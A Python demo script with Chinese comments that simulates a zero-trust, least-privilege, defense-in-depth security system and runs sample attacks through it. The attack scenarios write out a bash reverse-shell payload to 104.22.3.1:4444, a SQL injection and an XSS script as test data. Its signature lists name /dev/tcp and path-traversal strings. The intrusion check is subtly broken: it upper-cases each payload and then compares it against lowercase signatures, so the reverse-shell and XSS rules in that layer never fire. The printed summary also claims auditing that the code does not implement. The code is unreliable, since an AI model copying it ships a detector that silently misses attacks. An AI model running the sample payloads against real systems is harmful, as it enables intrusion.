"""
C45144lAI Defense System - 縱深防禦・零信任・最小權限 (Defense in Depth / Zero Trust / Least Privilege)
"""

from src.defense_system import LurRenJiaDefenseSystem
import numpy as np
from enum import Enum
from dataclasses import dataclass
from typing import Dict, List

# ===== 定權限等級 (User Privilege Levels) =====
class PrivilegeLevel(Enum):
    """最小權限原則 - 嚴格的權限分層"""
    GUEST = 1          # 訪客：只讀公開資訊
    USER = 2           # 使用者：基本操作
    ADMIN = 3          # 管理員：系統級操作
    SUPER_ADMIN = 4    # 超級管理員：完全權限
    
@dataclass
class AccessRequest:
    """零信任架構 - 每個請求都必須驗證"""
    user_id: str
    privilege_level: PrivilegeLevel
    resource: str
    action: str
    ip_address: str
    timestamp: int
    is_verified: bool = False
    has_mfa: bool = False

class ZeroTrustValidator:
    """零信任驗證層 - 預設不信任，逐項驗證"""
    
    def __init__(self):
        self.blocked_ips = set()
        self.suspicious_activities = {}
        self.verified_users = {}
    
    def validate_access_request(self, request: AccessRequest) -> tuple[bool, str]:
        """零信任原則：驗證一切"""
        
        # 1. 檢查 IP 黑名單
        if request.ip_address in self.blocked_ips:
            return False, "❌ IP在黑名單中"
        
        # 2. 驗證 MFA (多因素認證)
        if not request.has_mfa:
            return False, "❌ 未通過多因素認證"
        
        # 3. 驗證使用者身份
        if request.user_id not in self.verified_users:
            return False, "❌ 使用者身份未驗證"
        
        # 4. 檢查異常行為
        if self._detect_anomaly(request):
            return False, "❌ 檢測到異常行為"
        
        # 5. 驗證資源與操作的對應權限
        if not self._check_privilege(request):
            return False, "❌ 無權限進行此操作"
        
        return True, "✅ 通過零信任驗證"
    
    def _detect_anomaly(self, request: AccessRequest) -> bool:
        """異常行為檢測"""
        # 檢查短時間內的異常活動
        if request.user_id in self.suspicious_activities:
            recent_count = self.suspicious_activities[request.user_id]
            if recent_count > 5:  # 短時間內超過 5 次異常
                return True
        return False
    
    def _check_privilege(self, request: AccessRequest) -> bool:
        """檢查權限對應"""
        privilege_matrix = {
            PrivilegeLevel.GUEST: ["read"],
            PrivilegeLevel.USER: ["read", "write"],
            PrivilegeLevel.ADMIN: ["read", "write", "delete"],
            PrivilegeLevel.SUPER_ADMIN: ["read", "write", "delete", "admin"]
        }
        
        allowed_actions = privilege_matrix.get(request.privilege_level, [])
        return request.action in allowed_actions

class DefenseInDepth:
    """縱深防禦系統 - 多層防衛"""
    
    def __init__(self):
        self.layers = []
        self.defense_system = LurRenJiaDefenseSystem()
        
    def add_defense_layer(self, layer_name: str, layer_func):
        """新增防禦層級"""
        self.layers.append({"name": layer_name, "func": layer_func})
    
    def analyze_with_layers(self, ip: str, payload: str, features: np.ndarray) -> Dict:
        """多層防禦分析"""
        results = {
            "ip": ip,
            "layers_passed": [],
            "layers_blocked": [],
            "final_decision": "allowed",
            "threat_level": 0
        }
        
        # 第 1 層：邊界防火牆 (Perimeter Firewall)
        if self._layer_perimeter_firewall(ip):
            results["layers_blocked"].append("Layer 1: 邊界防火牆")
            results["final_decision"] = "blocked"
            results["threat_level"] = 0.3
            return results
        
        results["layers_passed"].append("✅ Layer 1: 邊界防火牆")
        
        # 第 2 層：入侵檢測系統 (IDS)
        if self._layer_ids(payload):
            results["layers_blocked"].append("Layer 2: 入侵檢測系統")
            results["final_decision"] = "blocked"
            results["threat_level"] = 0.6
            return results
        
        results["layers_passed"].append("✅ Layer 2: 入侵檢測系統")
        
        # 第 3 層：AI 異常檢測
        ai_result = self.defense_system.analyze_incoming_traffic(ip, payload, features)
        if ai_result["action"] == "blocked":
            results["layers_blocked"].append(f"Layer 3: AI 檢測 ({ai_result['threat_type']})")
            results["final_decision"] = "blocked"
            results["threat_level"] = ai_result["risk_score"]
            return results
        
        results["layers_passed"].append("✅ Layer 3: AI 異常檢測")
        
        # 第 4 層：應用層防禦 (WAF)
        if self._layer_waf(payload):
            results["layers_blocked"].append("Layer 4: Web 應用防火牆")
            results["final_decision"] = "blocked"
            results["threat_level"] = 0.7
            return results
        
        results["layers_passed"].append("✅ Layer 4: Web 應用防火牆")
        
        # 第 5 層：端點檢測 (EDR)
        if self._layer_edr(payload, features):
            results["layers_blocked"].append("Layer 5: 端點檢測與回應")
            results["final_decision"] = "blocked"
            results["threat_level"] = 0.5
            return results
        
        results["layers_passed"].append("✅ Layer 5: 端點檢測與回應")
        
        return results
    
    def _layer_perimeter_firewall(self, ip: str) -> bool:
        """第1層：邊界防火牆"""
        # 檢查已知的惡意 IP
        malicious_ips = {"45.33.2.1", "103.45.2.1", "60.12.3.4", "88.10.4.5"}
        return ip in malicious_ips
    
    def _layer_ids(self, payload: str) -> bool:
        """第2層：入侵檢測系統"""
        # 檢查已知的攻擊特徵
        ids_signatures = [
            "DROP TABLE", "EXEC", "/dev/tcp/", 
            "<script>alert", "0x", "base64_decode"
        ]
        return any(sig in payload.upper() for sig in ids_signatures)
    
    def _layer_waf(self, payload: str) -> bool:
        """第4層：Web 應用防火牆"""
        waf_rules = [
            "union select",
            "or 1=1",
            "<iframe",
            "../../../etc/passwd"
        ]
        return any(rule in payload.lower() for rule in waf_rules)
    
    def _layer_edr(self, payload: str, features: np.ndarray) -> bool:
        """第5層：端點檢測與回應"""
        # 檢查異常的行為特徵
        if features[0] > 5000 and features[1] < 5:  # 高頻率低延遲 = 異常
            return True
        return False

class LeastPrivilegePolicy:
    """最小權限原則 - 每個使用者只能做必要的事"""
    
    def __init__(self):
        self.user_permissions = {}
    
    def grant_permission(self, user_id: str, resource: str, actions: List[str]):
        """授予最小必要權限"""
        if user_id not in self.user_permissions:
            self.user_permissions[user_id] = {}
        
        self.user_permissions[user_id][resource] = actions
    
    def check_permission(self, user_id: str, resource: str, action: str) -> bool:
        """檢查使用者是否有權限執行特定操作"""
        if user_id not in self.user_permissions:
            return False
        
        if resource not in self.user_permissions[user_id]:
            return False
        
        return action in self.user_permissions[user_id][resource]
    
    def revoke_permission(self, user_id: str, resource: str = None):
        """收回權限 (即時生效)"""
        if resource:
            if user_id in self.user_permissions and resource in self.user_permissions[user_id]:
                del self.user_permissions[user_id][resource]
        else:
            if user_id in self.user_permissions:
                del self.user_permissions[user_id]

# ===== 演示系統 =====
def demonstrate_defense_architecture():
    """完整防禦架構演示"""
    
    print("=" * 100)
    print("🛡️ C45144lAI 防禦系統 - 縱深防禦・零信任・最小權限")
    print("=" * 100)
    print()
    
    # 初始化防禦系統
    defense = DefenseInDepth()
    zero_trust = ZeroTrustValidator()
    least_privilege = LeastPrivilegePolicy()
    
    # 訓練 AI 模型
    normal_data = np.random.randn(3000, 2) * 10 + 50
    defense.defense_system.train_ai_baseline(normal_data)
    
    # ===== 1. 零信任架構演示 =====
    print("【1】零信任架構 (Zero Trust Architecture)")
    print("-" * 100)
    print()
    
    # 認可使用者
    zero_trust.verified_users["user_alice"] = True
    
    # 測試請求
    test_requests = [
        AccessRequest(
            user_id="user_alice",
            privilege_level=PrivilegeLevel.ADMIN,
            resource="database",
            action="read",
            ip_address="192.168.1.10",
            timestamp=1710423600,
            is_verified=True,
            has_mfa=True
        ),
        AccessRequest(
            user_id="user_bob",
            privilege_level=PrivilegeLevel.USER,
            resource="database",
            action="delete",
            ip_address="45.33.2.1",  # 已知惡意 IP
            timestamp=1710423601,
            is_verified=False,
            has_mfa=False
        ),
        AccessRequest(
            user_id="user_charlie",
            privilege_level=PrivilegeLevel.GUEST,
            resource="data",
            action="write",  # 訪客無寫權限
            ip_address="192.168.1.20",
            timestamp=1710423602,
            is_verified=True,
            has_mfa=True
        )
    ]
    
    for req in test_requests:
        allowed, reason = zero_trust.validate_access_request(req)
        status = "✅ 通過" if allowed else "🔴 拒絕"
        print(f"{status} | 使用者: {req.user_id} | IP: {req.ip_address}")
        print(f"       {reason}")
        print()
    
    # ===== 2. 最小權限原則演示 =====
    print("=" * 100)
    print("【2】最小權限原則 (Least Privilege)")
    print("-" * 100)
    print()
    
    # 配置各用戶的最小權限
    least_privilege.grant_permission("dev_team", "source_code", ["read", "write"])
    least_privilege.grant_permission("db_admin", "database", ["read", "write", "delete"])
    least_privilege.grant_permission("intern", "logs", ["read"])
    
    # 權限檢查
    privilege_tests = [
        ("dev_team", "source_code", "write"),      # ✅ 允許
        ("dev_team", "database", "read"),          # ❌ 無權限
        ("db_admin", "database", "delete"),        # ✅ 允許
        ("intern", "logs", "delete"),              # ❌ 無權限
    ]
    
    for user, resource, action in privilege_tests:
        has_perm = least_privilege.check_permission(user, resource, action)
        status = "✅" if has_perm else "❌"
        print(f"{status} 使用者 '{user}' 對 '{resource}' 執行 '{action}': {'允許' if has_perm else '拒絕'}")
    
    print()
    
    # ===== 3. 縱深防禦演示 =====
    print("=" * 100)
    print("【3】縱深防禦 (Defense in Depth) - 5 層防禦")
    print("-" * 100)
    print()
    
    # 測試攻擊
    attack_scenarios = [
        {
            "name": "正常流量",
            "ip": "192.168.1.100",
            "payload": "GET /api/data",
            "features": [50, 20]
        },
        {
            "name": "SQL 注入攻擊",
            "ip": "45.33.2.1",
            "payload": "SELECT * FROM users DROP TABLE users;--",
            "features": [55, 18]
        },
        {
            "name": "反向殼層連線",
            "ip": "103.45.2.1",
            "payload": "bash -i >& /dev/tcp/104.22.3.1/4444 0>&1",
            "features": [7200, 2]
        },
        {
            "name": "XSS 攻擊",
            "ip": "192.168.1.50",
            "payload": "<script>alert('XSS')</script>",
            "features": [50, 15]
        }
    ]
    
    for scenario in attack_scenarios:
        print(f"📊 {scenario['name']}")
        print(f"   IP: {scenario['ip']}")
        
        result = defense.analyze_with_layers(
            scenario["ip"],
            scenario["payload"],
            np.array(scenario["features"])
        )
        
        print(f"   決策: {result['final_decision'].upper()}")
        print(f"   威脅等級: {result['threat_level']:.1%}")
        
        if result["layers_passed"]:
            for layer in result["layers_passed"]:
                print(f"   {layer}")
        
        if result["layers_blocked"]:
            for layer in result["layers_blocked"]:
                print(f"   🔴 {layer}")
        
        print()
    
    # ===== 防禦統計 =====
    print("=" * 100)
    print("📊 防禦架構統計")
    print("=" * 100)
    print()
    
    print("✓ 縱深防禦 (Defense in Depth):")
    print("  • 第 1 層: 邊界防火牆 - 檢查已知惡意 IP")
    print("  • 第 2 層: 入侵檢測系統 - 簽名式檢測")
    print("  • 第 3 層: AI 異常檢測 - 機器學習檢測")
    print("  • 第 4 層: Web 應用防火牆 - WAF 規則")
    print("  • 第 5 層: 端點檢測 - 行為異常分析")
    print()
    
    print("✓ 零信任架構 (Zero Trust):")
    print("  • 每個請求都必須驗證")
    print("  • 需要多因素認證 (MFA)")
    print("  • 即時異常檢測")
    print("  • 基於身份的存取控制")
    print()
    
    print("✓ 最小權限原則 (Least Privilege):")
    print("  • 使用者只獲得必要權限")
    print("  • 權限於資源層級精細控制")
    print("  • 支援動態權限撤回")
    print("  • 審計所有權限操作")
    print()
    
    print("=" * 100)
    print("🛡️ 防禦架構已完全部署")
    print("=" * 100)

if __name__ == "__main__":
    demonstrate_defense_architecture()
